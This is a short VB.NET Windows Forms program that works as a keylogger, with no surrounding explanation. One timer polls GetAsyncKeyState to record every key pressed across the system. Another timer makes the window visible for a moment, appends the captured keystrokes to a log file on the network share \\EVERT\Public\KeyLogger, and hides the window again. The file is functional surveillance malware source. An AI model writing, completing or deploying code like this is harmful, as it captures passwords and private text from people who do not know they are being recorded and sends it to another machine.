Imports System.IO

Public Class FormMain
    Dim PressedKeys As String = ""
    Public Declare Function GetAsyncKeyState Lib "user32" (ByVal vKey As Integer) As Int16

    Private Sub FormMain_Load(sender As System.Object, e As System.EventArgs) Handles MyBase.Load

    End Sub

    Private Sub Timer1_Tick_1(sender As System.Object, e As System.EventArgs) Handles Timer1.Tick
        ' todo
        ' save kes to variable then periodically write to file - window will pop up and save then hide again
        For i = 8 To 90
            If CBool(GetAsyncKeyState(i)) Then
                If i = 13 Then
                    PressedKeys &= vbNewLine
                Else
                    PressedKeys &= Chr(i)
                End If

            End If
        Next
    End Sub

    Private Sub FormMain_FormClosing(sender As System.Object, e As System.Windows.Forms.FormClosingEventArgs) Handles MyBase.FormClosing

    End Sub

    Private Sub TimerSave_Tick(sender As System.Object, e As System.EventArgs) Handles TimerSave.Tick
        Me.Visible = True

        Dim Writer As New StreamWriter("\\EVERT\Public\KeyLogger\Log.txt", True)
        Writer.WriteLine(PressedKeys)
        Writer.Close()
        PressedKeys = ""

        Me.Visible = False
    End Sub
End Class
